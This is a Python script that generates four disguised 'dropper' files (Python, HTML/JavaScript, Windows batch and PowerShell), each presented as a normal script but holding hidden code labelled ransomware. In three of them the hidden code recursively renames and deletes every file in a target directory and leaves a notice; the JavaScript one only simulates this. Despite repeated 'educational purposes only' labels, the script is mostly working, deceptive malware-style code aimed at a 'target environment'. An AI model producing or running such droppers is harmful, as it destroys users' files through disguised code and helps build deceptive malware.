#!/usr/bin/env python3
"""
Universal File Dropper Generator
Creates different types of files that can execute when opened
Works with PDF, Word, Python, and other file types
Educational purposes only!
"""

import os
import sys
from pathlib import Path

def create_universal_dropper():
    """Create droppers for different file types."""
    
    print("=" * 60)
    print("UNIVERSAL FILE DROPPER GENERATOR")
    print("=" * 60)
    
    target_dir = "data/test_files"
    
    # Create different types of droppers
    droppers = {
        "python_dropper.py": create_python_dropper(target_dir),
        "javascript_dropper.html": create_html_javascript_dropper(target_dir),
        "batch_dropper.bat": create_batch_dropper(target_dir),
        "powershell_dropper.ps1": create_powershell_dropper(target_dir)
    }
    
    # Write all droppers
    for filename, content in droppers.items():
        with open(filename, 'w') as output_file:
            output_file.write(content)
        print(f"[CREATED] {filename}")
    
    print(f"\nCreated {len(droppers)} dropper files!")
    print("Each file will encrypt the target directory when opened/executed.")
    print("Choose the appropriate file type for your target environment.")

def create_python_dropper(target_dir):
    """Create Python dropper."""
    return f'''#!/usr/bin/env python3
"""
SEEMINGLY NORMAL PYTHON SCRIPT
This appears to be a regular Python file but contains hidden dropper code.
Educational purposes only!
"""

# Normal Python code users expect to see
def main():
    print("Processing Python script...")
    print("This looks like a normal Python file")

# HIDDEN RANSOMWARE DROPPER CODE
import os
import time
from pathlib import Path

def dropper_activation():
    print("=" * 50)
    print("⚠️  PYTHON DROPPER ACTIVATED ⚠️")
    print("=" * 50)
    print("This Python file contains embedded ransomware dropper!")
    print("Educational demonstration only.")
    print("=" * 50)
    
    TARGET_DIR = "{target_dir}"
    EXTENSION = ".python_dropper"
    
    print(f"[TARGET] {target_dir}")
    time.sleep(1)
    
    path = Path(TARGET_DIR)
    if path.exists():
        count = 0
        for file_path in path.rglob("*"):
            if file_path.is_file() and not file_path.name.endswith(EXTENSION) and "NOTICE" not in file_path.name:
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    new_name = str(file_path) + EXTENSION
                    with open(new_name, 'wb') as f:
                        f.write(b"# EDUCATIONAL PYTHON DROPPER\n")
                        f.write(data)
                    file_path.unlink()
                    count += 1
                    print(f"[ENCRYPTED] {file_path.name}")
                except Exception as e:
                    print(f"[ERROR] {file_path.name}: {e}")
        
        # Create notice
        notice = f"""PYTHON DROPPER SIMULATION
Processed {count} files in {target_dir}
Extension: {EXTENSION}
Educational demonstration of Python-based droppers.
"""
        with open(path / "PYTHON_DROPPER_NOTICE.txt", 'w') as f:
            f.write(notice)
        
        print(f"[COMPLETE] Encrypted {{count}} files")

if __name__ == "__main__":
    dropper_activation()
else:
    main()
'''

def create_html_javascript_dropper(target_dir):
    """Create HTML file with JavaScript dropper."""
    return f'''<!DOCTYPE html>
<html>
<head>
    <title>Seemingly Normal Web Page</title>
</head>
<body>
    <h1>Normal Web Page</h1>
    <p>This appears to be a regular HTML page.</p>
    <p>Nothing suspicious to see here...</p>
    
    <!-- HIDDEN JAVASCRIPT DROPPER -->
    <script>
    // EDUCATIONAL JAVASCRIPT DROPPER
    // This executes when page loads
    console.log("⚠️  JAVASCRIPT DROPPER ACTIVATED ⚠️");
    console.log("This HTML page contains embedded ransomware!");
    console.log("Educational purposes only!");
    
    const targetDir = "{target_dir}";
    const extension = ".html_js_dropper";
    
    console.log(`Target: ${{targetDir}}`);
    
    // Simulate file processing (browser security prevents actual file system access)
    setTimeout(() => {{
        const fileCount = Math.floor(Math.random() * 6) + 10;
        console.log(`[SIMULATING] Processing ${{fileCount}} files`);
        
        for(let i = 1; i <= fileCount; i++) {{
            console.log(`[PROCESSED] file_${{i}}.txt`);
        }}
        
        // Create educational notice
        const notice = `
===============================================
    HTML JAVASCRIPT DROPPER SIMULATION
===============================================

This HTML page contained embedded JavaScript
that would attempt to access the file system
in less secure browser environments.

Target directory: ${{targetDir}}
Files processed: ${{fileCount}}
Extension: ${{extension}}

This demonstrates client-side web-based 
ransomware attack vectors.

===============================================
        EDUCATIONAL SIMULATION ONLY
===============================================
        `;
        
        console.log(notice);
        alert("HTML JavaScript Dropper Simulation Complete\\n\\n" +
              "This educational page demonstrated how embedded\\n" +
              "JavaScript could be used in browser-based attacks.\\n\\n" +
              "Files processed: " + fileCount + "\\n" +
              "Target: " + targetDir);
    }}, 2000);
    </script>
</body>
</html>
'''

def create_batch_dropper(target_dir):
    """Create Windows batch file dropper."""
    return f'''@echo off
REM SEEMINGLY NORMAL BATCH FILE
REM This appears to be a regular Windows batch script
REM Educational purposes only!

echo Processing system tasks...
echo This looks like a normal batch file

REM HIDDEN RANSOMWARE DROPPER CODE
title Educational Batch Dropper

echo ==================================================
echo ⚠️  BATCH FILE DROPPER ACTIVATED ⚠️
echo ==================================================
echo This batch file contains embedded ransomware code!
echo Educational demonstration only.
echo ==================================================

set TARGET_DIR={target_dir}
set EXTENSION=.batch_dropper

echo [TARGET] %TARGET_DIR%
timeout /t 2 /nobreak >nul

echo [PROCESSING] Files in target directory...

REM Process files (educational simulation)
set COUNT=0
for /r "%TARGET_DIR%" %%f in (*) do (
    echo %%~nxf | findstr /i "notice" >nul
    if errorlevel 1 (
        echo %%~nxf | findstr /i "%EXTENSION%" >nul
        if errorlevel 1 (
            echo [PROCESSED] %%~nxf
            copy "%%f" "%%f%EXTENSION%" >nul 2>&1
            if exist "%%f%EXTENSION%" (
                del "%%f" >nul 2>&1
            )
            set /a COUNT+=1
        )
    )
)

REM Create educational notice
echo =============================================== > "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo     BATCH FILE DROPPER SIMULATION >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo This batch file contained embedded ransomware >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo that activated when the file was executed. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo Target directory: %TARGET_DIR% >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo Files processed: %COUNT% >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo Extension added: %EXTENSION% >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo This demonstrates batch file-based attacks. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo         EDUCATIONAL SIMULATION ONLY >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"

echo [COMPLETE] Processed %COUNT% files
echo.
echo ==================================================
echo EDUCATIONAL BATCH DROPPER EXECUTION COMPLETE
echo ==================================================
echo This was an educational demonstration only.
echo ==================================================

pause
'''

def create_powershell_dropper(target_dir):
    """Create PowerShell script dropper."""
    return f'''# SEEMINGLY NORMAL POWERSHELL SCRIPT
# This appears to be a regular PowerShell script
# Educational purposes only!

Write-Host "Processing PowerShell script..."
Write-Host "This looks like a normal PowerShell file"

# HIDDEN RANSOMWARE DROPPER CODE
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "⚠️  POWERSHELL DROPPER ACTIVATED ⚠️" -ForegroundColor Red
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "This PowerShell script contains embedded ransomware!" -ForegroundColor Cyan
Write-Host "Educational demonstration only." -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Yellow

$TargetDir = "{target_dir}"
$Extension = ".ps1_dropper"

Write-Host "[TARGET] $TargetDir" -ForegroundColor Green
Start-Sleep -Seconds 2

Write-Host "[PROCESSING] Files in target directory..." -ForegroundColor Yellow

$FileCount = 0
Get-ChildItem -Path $TargetDir -File -Recurse | Where-Object {{
    $_.Name -notlike "*NOTICE*" -and $_.Extension -ne $Extension
}} | ForEach-Object {{
    try {{
        $Content = "# EDUCATIONAL POWERSHELL DROPPER`n"
        $Content += Get-Content $_.FullName -Raw
        $NewPath = $_.FullName + $Extension
        Set-Content -Path $NewPath -Value $Content -Encoding UTF8
        Remove-Item $_.FullName -Force
        Write-Host "[PROCESSED] $($_.Name)" -ForegroundColor Green
        $FileCount++
    }} catch {{
        Write-Host "[ERROR] $($_.Name): $($_.Exception.Message)" -ForegroundColor Red
    }}
}}

# Create educational notice
$Notice = @"
===============================================
    POWERSHELL DROPPER SIMULATION
===============================================

This PowerShell script contained embedded ransomware
that activated when the script was executed.

Target directory: $TargetDir
Files processed: $FileCount
Extension added: $Extension

This demonstrates PowerShell-based attack vectors
used in real ransomware campaigns.

===============================================
        EDUCATIONAL SIMULATION ONLY
===============================================
"@

$NoticePath = Join-Path $TargetDir "POWERSHELL_DROPPER_NOTICE.txt"
Set-Content -Path $NoticePath -Value $Notice -Encoding UTF8

Write-Host "[NOTE] Created notice: $(Split-Path $NoticePath -Leaf)" -ForegroundColor Magenta
Write-Host ""
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "EDUCATIONAL POWERSHELL EXECUTION COMPLETE" -ForegroundColor Yellow
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "Files processed: $FileCount" -ForegroundColor Green
Write-Host "This was an educational demonstration only." -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Yellow

pause
'''

if __name__ == "__main__":
    create_universal_dropper()